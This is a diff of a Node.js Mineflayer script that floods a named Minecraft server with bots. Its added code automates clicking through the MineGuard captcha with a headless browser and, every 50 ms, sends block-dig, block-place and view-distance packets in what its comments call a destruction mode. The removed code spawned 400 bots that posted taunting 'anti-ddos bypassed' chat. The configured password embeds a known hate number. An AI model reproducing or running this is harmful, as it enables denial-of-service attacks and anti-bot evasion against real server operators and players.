@@ -1,44 +1,69 @@
-const cluster = require("cluster");
-const mineflayer = require("mineflayer");
+const mineflayer = require('mineflayer');
+const playwright = require('playwright-chromium');
+
 const SETTINGS = {
     host: "mc.risemine.space",
     port: 25565,
     version: "1.16.5",
-    totalBots: 400,
-    joinDelay: 1100,
-    pass: "asdasdasd",
-    trashTalk: [
-        "anti-ddos bypassed :smirk_cat:", "anti-cheat the best anticheat :cry:",
-        "your anti-ddos = your ass", "WORST ANTI-DDOS EVER", "die",
-        "hosting? nn", "try to bypass me", "oneshot is crying",
-        "the world machine is crying... this is the worst code he has ever seen...",
-        "neiron anticheat free download no backdoor", "neiron anticheat the best anticheat!!"
-    ]
+    pass: "johnsinna1941_1488",
+    botCount: 10 // Количество ботов на ОДИН процесс (не переборщи, браузер ест RAM)
 };
-if (cluster.isMaster) {
-    for (let i = 0; i < 2; i++) cluster.fork();
-} else {
-    const startOffset = cluster.worker.id === 1 ? 0 : 1;
-    for (let i = startOffset; i < SETTINGS.totalBots; i += 2) {
-        setTimeout(() => startBot(i), (i / 2) * SETTINGS.joinDelay);
+
+async function passCaptcha(url) {
+    let browser;
+    try {
+        browser = await playwright.chromium.launch({ headless: true });
+        const page = await browser.newPage();
+        console.log(`[MineGuard] Пробую пробить: ${url}`);
+        await page.goto(url, { waitUntil: 'networkidle' });
+        // Пытаемся кликнуть по чекбоксу, если он есть
+        const checkbox = await page.$('.recaptcha-checkbox-border');
+        if (checkbox) await checkbox.click();
+        await page.waitForTimeout(5000); 
+        await browser.close();
+    } catch (e) {
+        if (browser) await browser.close();
+        console.log("[Error] Ошибка браузера или капчи.");
     }
 }
-function startBot(id) {
-    const isAnarchy = id % 2 === 0;
-    const names = ["Niko", "Rue", "WorldMachine"];
-    const username = names[Math.floor(Math.random() * names.length)] + "_" + Math.random().toString(36).substring(7);
-    const bot = mineflayer.createBot({ host: SETTINGS.host, port: SETTINGS.port, username: username, version: SETTINGS.version, viewDistance: "tiny" });
-    bot.on("spawn", () => {
-        setTimeout(() => {
-            bot.chat(SETTINGS.pass + " " + SETTINGS.pass);
-            setTimeout(() => { bot.setQuickBarSlot(4); bot.activateItem(); }, 3000);
-        }, 2000);
+
+function createBot(id) {
+    const username = `Niko_${Math.random().toString(36).substring(7)}`;
+    const bot = mineflayer.createBot({
+        host: SETTINGS.host,
+        port: SETTINGS.port,
+        username: username,
+        version: SETTINGS.version
     });
-    bot.on("windowOpen", () => {
-        setTimeout(async () => {
-            try { await bot.clickWindow(isAnarchy ? 13 : 15, 0, 0); } catch (e) {}
-        }, 2000);
+
+    bot.on('message', (jsonMsg) => {
+        const msg = jsonMsg.toString();
+        if (msg.includes('mineguard.pro/captcha/')) {
+            const url = msg.match(/https:\/\/mineguard\.pro\/captcha\/[a-zA-Z0-9]+/)[0];
+            passCaptcha(url);
+        }
     });
-    bot.on("end", () => setTimeout(() => startBot(id), 8000));
-    bot.on("error", () => {});
+
+    bot.on('spawn', () => {
+        setTimeout(() => bot.chat(`${SETTINGS.pass} ${SETTINGS.pass}`), 2000);
+        
+        // Режим уничтожения (Блоки + Пакеты + Чанки)
+        setInterval(() => {
+            if (bot.entity) {
+                const pos = bot.entity.position.floored();
+                // Спам пакетами блоков
+                bot._client.write('block_dig', { status: 0, location: pos.offset(0, -1, 0), face: 1 });
+                bot._client.write('block_place', { hand: 0, location: pos.offset(0, -1, 0), direction: 1, cursorX: 0.5, cursorY: 0.5, cursorZ: 0.5, insideBlock: false });
+                // Спам перемещением (Чанки)
+                bot._client.write('settings', { locale: 'en_US', viewDistance: Math.random() > 0.5 ? 32 : 1, chatFlags: 0, chatColors: true, skinParts: 127, mainHand: 0 });
+            }
+        }, 50);
+    });
+
+    bot.on('error', () => {});
+    bot.on('end', () => setTimeout(() => createBot(id), 5000));
+}
+
+for (let i = 0; i < SETTINGS.botCount; i++) {
+    setTimeout(() => createBot(i), i * 1000);
 }
